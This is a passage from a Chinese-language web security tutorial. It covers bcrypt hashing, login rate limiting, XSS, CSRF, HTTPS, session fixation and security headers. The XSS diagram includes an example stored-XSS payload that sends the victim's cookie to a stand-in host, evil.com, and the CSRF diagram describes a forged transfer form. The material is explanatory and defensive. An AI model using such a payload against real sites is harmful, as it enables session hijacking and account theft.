### 2.3 bcrypt 工作原理

```mermaid
graph LR
    A["用户密码<br/>123456"] --> B["生成随机盐<br/>$2b$12$salt..."]
    B --> C["bcrypt 多轮哈希计算<br/>cost factor = 12<br/>（2^12 = 4096 轮）"]
    C --> D["最终存储<br/>$2b$12$salt...hash..."]
    
    E["验证时"] --> F["从存储值中<br/>提取盐和轮数"]
    F --> G["用相同参数<br/>重新计算"]
    G --> H{"结果一致？"}
    H -->|是| I["✅ 密码正确"]
    H -->|否| J["❌ 密码错误"]

    style D fill:#c8e6c9
```

### 2.4 代码示例

```javascript
const bcrypt = require('bcrypt');

// 注册时：加密密码
async function hashPassword(plainPassword) {
  const saltRounds = 12;  // 成本因子，越高越安全但越慢
  const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
  // 结果示例: "$2b$12$LJ3m4ys3Lg7EPnBqFWHNWOqxF1oVpWJGrWOqH9JFTkBanQf7z/XGi"
  return hashedPassword;
}

// 登录时：验证密码
async function verifyPassword(plainPassword, hashedPassword) {
  const isMatch = await bcrypt.compare(plainPassword, hashedPassword);
  return isMatch;  // true 或 false
}
```

```python
# Python 使用 bcrypt
import bcrypt

# 注册时
def hash_password(plain_password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(plain_password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

# 登录时
def verify_password(plain_password: str, hashed_password: str) -> bool:
    return bcrypt.checkpw(
        plain_password.encode('utf-8'),
        hashed_password.encode('utf-8')
    )
```

## 三、暴力破解防护

### 3.1 攻击方式

| 攻击类型 | 说明 | 速度 |
|----------|------|------|
| **暴力破解** | 尝试所有可能的密码组合（aaa, aab, aac...） | 慢 |
| **字典攻击** | 使用常见密码列表（123456, password, admin...） | 中 |
| **撞库攻击** | 用其他网站泄露的"用户名+密码"尝试登录 | 快且有效 |

### 3.2 防护措施

```mermaid
graph TD
    A["暴力破解防护"] --> B["🔢 验证码"]
    A --> C["⏰ 登录频率限制"]
    A --> D["🔒 账号锁定"]
    A --> E["📋 密码强度要求"]
    A --> F["🔔 异常告警"]
    
    B --> B1["图片验证码 / 滑块验证<br/>错误N次后触发"]
    C --> C1["限制每个IP/账号的登录频率<br/>如：每分钟最多5次"]
    D --> D1["连续错误N次后<br/>临时锁定账号15-30分钟"]
    E --> E1["密码长度≥8<br/>包含大小写+数字+特殊字符"]
    F --> F1["异地登录提醒<br/>登录失败次数异常告警"]

    style B fill:#c8e6c9
    style C fill:#c8e6c9
    style D fill:#c8e6c9
```

### 3.3 限流策略实现

```mermaid
sequenceDiagram
    participant 攻击者 as 🦹 攻击者
    participant 服务器 as 🖥️ 服务器
    participant Redis as 🔴 Redis

    攻击者->>服务器: 第1次尝试登录（错误密码）
    服务器->>Redis: login_fail:user123 = 1（5分钟过期）
    服务器-->>攻击者: ❌ 密码错误

    攻击者->>服务器: 第2次尝试登录（错误密码）
    服务器->>Redis: login_fail:user123 = 2
    服务器-->>攻击者: ❌ 密码错误

    攻击者->>服务器: 第3次尝试登录（错误密码）
    服务器->>Redis: login_fail:user123 = 3
    服务器-->>攻击者: ❌ 密码错误，需要验证码

    攻击者->>服务器: 第5次尝试登录（错误密码）
    服务器->>Redis: login_fail:user123 = 5
    服务器-->>攻击者: 🔒 账号已被临时锁定30分钟

    Note over 服务器,Redis: 同时按IP维度计数<br/>防止遍历不同账号
```

### 3.4 代码示例

```javascript
const Redis = require('ioredis');
const redis = new Redis();

async function checkLoginRateLimit(username, ip) {
  const userKey = `login_fail:user:${username}`;
  const ipKey = `login_fail:ip:${ip}`;
  
  const [userFails, ipFails] = await Promise.all([
    redis.get(userKey),
    redis.get(ipKey)
  ]);
  
  // 账号维度：5次失败 → 锁定30分钟
  if (parseInt(userFails) >= 5) {
    return { blocked: true, reason: '账号已被临时锁定，请30分钟后重试' };
  }
  
  // IP维度：20次失败 → 封禁IP 1小时
  if (parseInt(ipFails) >= 20) {
    return { blocked: true, reason: 'IP已被临时封禁，请稍后重试' };
  }
  
  // 3次失败后要求验证码
  if (parseInt(userFails) >= 3) {
    return { blocked: false, requireCaptcha: true };
  }
  
  return { blocked: false, requireCaptcha: false };
}

async function recordLoginFailure(username, ip) {
  const userKey = `login_fail:user:${username}`;
  const ipKey = `login_fail:ip:${ip}`;
  
  await Promise.all([
    redis.multi()
      .incr(userKey)
      .expire(userKey, 1800)  // 30分钟过期
      .exec(),
    redis.multi()
      .incr(ipKey)
      .expire(ipKey, 3600)    // 1小时过期
      .exec()
  ]);
}

async function clearLoginFailure(username) {
  await redis.del(`login_fail:user:${username}`);
}
```

## 四、XSS（跨站脚本攻击）防护

### 4.1 XSS 攻击原理

**XSS（Cross-Site Scripting）** 是攻击者在网页中注入恶意脚本，当其他用户浏览该页面时，恶意脚本会在用户浏览器中执行。

```mermaid
sequenceDiagram
    participant 攻击者 as 🦹 攻击者
    participant 服务器 as 🖥️ 服务器
    participant 受害者 as 👤 受害者

    攻击者->>服务器: ① 在评论区提交恶意内容：<br/><script>fetch('evil.com?cookie='+document.cookie)</script>
    服务器->>服务器: ② 存储了这条"评论"
    
    受害者->>服务器: ③ 浏览评论区
    服务器-->>受害者: ④ 返回页面（包含恶意脚本）
    受害者->>受害者: ⑤ 浏览器执行恶意脚本
    受害者->>攻击者: ⑥ 受害者的 Cookie/Token 被发送到攻击者的服务器
    
    攻击者->>服务器: ⑦ 用窃取的Cookie/Token冒充受害者
```

### 4.2 XSS 防护措施

```mermaid
graph TD
    A["XSS 防护策略"] --> B["🍪 Cookie设置HttpOnly"]
    A --> C["🔒 输入过滤与输出编码"]
    A --> D["🛡️ CSP内容安全策略"]
    A --> E["📝 使用安全的模板引擎"]
    
    B --> B1["document.cookie无法读取<br/>即使XSS成功也拿不到Cookie"]
    C --> C1["输入时过滤危险字符<br/>输出时HTML实体编码<br/>< → &lt;  > → &gt;"]
    D --> D1["Content-Security-Policy响应头<br/>限制页面可以加载的资源来源<br/>禁止内联脚本执行"]
    E --> E1["React/Vue默认自动转义<br/>避免使用v-html/dangerouslySetInnerHTML"]

    style B fill:#c8e6c9
    style C fill:#c8e6c9
    style D fill:#c8e6c9
    style E fill:#c8e6c9
```

## 五、CSRF（跨站请求伪造）防护

### 5.1 CSRF 攻击原理

**CSRF（Cross-Site Request Forgery）** 是攻击者诱导已登录用户的浏览器向目标站点发送恶意请求。利用的是浏览器自动携带 Cookie 的特性。

```mermaid
sequenceDiagram
    participant 用户 as 👤 用户（已登录银行网站）
    participant 恶意网站 as 🦹 恶意网站
    participant 银行 as 🏦 银行网站

    用户->>银行: 正常登录银行网站
    银行-->>用户: 设置Cookie: session=abc123
    
    用户->>恶意网站: 被诱导访问恶意网站
    恶意网站-->>用户: 页面包含隐藏表单：<br/>自动提交 POST bank.com/transfer<br/>{to: "攻击者", amount: 10000}
    
    用户->>银行: 浏览器自动携带银行Cookie<br/>发起转账请求
    Note over 用户,银行: 银行服务器看到合法的Cookie<br/>以为是用户本人操作
    银行->>银行: 转账成功！😱
```

### 5.2 CSRF 防护措施

```mermaid
graph TD
    A["CSRF 防护策略"] --> B["🎫 CSRF Token"]
    A --> C["🍪 SameSite Cookie"]
    A --> D["🔍 检查 Referer/Origin"]
    A --> E["🔑 双重Cookie验证"]
    
    B --> B1["服务端生成随机Token<br/>嵌入表单隐藏字段<br/>提交时验证Token"]
    C --> C1["SameSite=Strict: 完全禁止跨站携带<br/>SameSite=Lax: 仅允许顶级导航携带<br/>SameSite=None: 无限制（需Secure）"]
    D --> D1["检查请求的Referer/Origin头<br/>是否来自合法的源"]
    E --> E1["Cookie中放一个随机值<br/>同时在请求参数中也放这个值<br/>服务端比对两者是否一致"]

    style B fill:#c8e6c9
    style C fill:#c8e6c9
```

### 5.3 CSRF Token 工作流程

```mermaid
sequenceDiagram
    participant 浏览器 as 🌐 浏览器
    participant 服务器 as 🖥️ 服务器

    浏览器->>服务器: GET /transfer 页面
    服务器->>服务器: 生成随机 CSRF Token
    服务器-->>浏览器: 返回页面 + 隐藏的 CSRF Token
    Note over 浏览器: <form><br/>  <input type="hidden"<br/>    name="_csrf"<br/>    value="random_token_123"><br/>  ...<br/></form>

    浏览器->>服务器: POST /transfer<br/>{_csrf: "random_token_123", to: "张三", amount: 100}
    服务器->>服务器: 验证 CSRF Token 是否匹配
    服务器-->>浏览器: ✅ 操作成功

    Note over 浏览器,服务器: 攻击者的恶意网站无法获取到 CSRF Token<br/>所以伪造的请求没有合法的Token → 被拒绝 ✅
```

### 6.1 攻击原理

### 6.2 防护方案：HTTPS

```mermaid
graph LR
    A["👤 用户"] -->|"HTTPS 加密传输<br/>※#&@!%$#...<br/>（密文，看不懂）"| B["🦹 中间人"]
    B -->|无法解密| B
```

**HTTPS 最佳实践：**

| 措施 | 说明 |
|------|------|
| ✅ 全站 HTTPS | 不仅是登录页，所有页面都要 HTTPS |
| ✅ HSTS | HTTP Strict Transport Security，强制浏览器使用 HTTPS |
| ✅ 证书验证 | 使用可信 CA 签发的证书（Let's Encrypt 免费） |
| ✅ Cookie Secure 属性 | Cookie 只在 HTTPS 下传输 |
| ✅ HTTP 重定向 HTTPS | 所有 HTTP 请求自动重定向到 HTTPS |

## 八、会话安全

### 8.1 Session 固定攻击

```mermaid
sequenceDiagram
    participant 攻击者 as 🦹 攻击者
    participant 受害者 as 👤 受害者
    participant 服务器 as 🖥️ 服务器

    攻击者->>服务器: ① 获取一个未登录的 Session ID: "abc123"
    攻击者->>受害者: ② 诱导受害者使用这个 Session ID<br/>（通过URL参数或注入Cookie）
    受害者->>服务器: ③ 用 Session ID "abc123" 登录
    服务器->>服务器: ④ 将 "abc123" 标记为已登录
    
    攻击者->>服务器: ⑤ 用相同的 "abc123" 访问
    服务器-->>攻击者: ⑥ 已登录！返回受害者的数据 😱
```

**防护**：登录成功后**必须重新生成 Session ID**！

```javascript
// 登录成功后
app.post('/login', (req, res) => {
  // 验证密码...
  
  // ✅ 重新生成 Session ID，防止 Session 固定攻击
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    res.json({ success: true });
  });
});
```

## 九、安全响应头配置

```javascript
// Express 安全头配置（使用 helmet 中间件）
const helmet = require('helmet');
app.use(helmet());

// 或手动设置
app.use((req, res, next) => {
  // 防止页面被嵌入iframe（防点击劫持）
  res.setHeader('X-Frame-Options', 'DENY');
  
  // XSS 过滤器
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // 防止 MIME 类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // 内容安全策略（CSP）
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
  
  // 强制 HTTPS
  res.setHeader('Strict-Transport-Security', 
    'max-age=31536000; includeSubDomains');
  
  // 控制 Referer 信息
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  next();
});
```
